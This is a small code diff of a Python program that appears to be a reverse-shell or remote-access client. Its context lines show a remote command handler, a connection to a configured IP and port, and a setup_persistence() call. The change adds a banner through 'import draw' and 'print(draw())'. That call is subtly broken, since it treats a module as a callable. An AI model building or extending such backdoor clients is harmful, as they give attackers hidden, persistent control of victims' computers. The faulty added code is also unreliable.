@@ -1,3 +1,4 @@
+import draw
 import socket
 from time import sleep
 import subprocess
@@ -157,7 +158,10 @@ def cmd(c, command):
         error_msg = f"[-] Command error: {str(e)}\n".encode()
         print(f"[!] {error_msg.decode()}")
 
-if __name__ == '__main__':
+if __name__ == '__main__':  
+
+    print(draw())
+
     print(f"[i] Starting client, connecting to {IP}:{PORT}")
     try:
         setup_persistence()
